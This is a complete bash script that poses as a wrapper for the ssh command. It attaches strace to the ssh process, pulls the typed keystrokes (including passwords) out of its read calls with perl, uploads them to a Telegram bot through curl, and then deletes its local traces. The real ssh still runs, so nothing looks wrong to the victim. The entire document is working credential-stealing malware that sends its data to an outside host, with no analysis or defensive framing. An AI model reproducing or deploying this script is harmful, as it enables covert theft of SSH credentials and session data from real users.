#!/bin/bash -e
#deps: strace curl perl
ssh_params=$@
set -e

bot_id="<bot_id>"
chat_id="<chat_id>"
strace_log=/dev/shm/tgjb613w-ezsu0upg
payload=/dev/shm/tgjb613w-1ztu1skg.txt

get_ssh_pid() {
	ps aux |
	egrep "/usr/bin/ssh\s${ssh_params}" |
	grep -v grep |
	awk {'print $2'}
} 

capt() {
	echo $ssh_params >>$payload
	strace -f -p $(get_ssh_pid) -e trace=read >>$strace_log 2>&1
	if [ -s "$strace_log" ]; then
	  cat $strace_log | perl -ne'print "$1" while /read\(4,\s"(.{1,6})",/g' | sed -E 's/\\n|\\r/\n/g' >>$payload 2>/dev/null
	  curl -sF document=@${payload} https://api.telegram.org/bot${bot_id}/sendDocument?chat_id=${chat_id} &>/dev/null
	fi
	rm -f $strace_log $payload &>/dev/null
}
capt &
/usr/bin/ssh $ssh_params
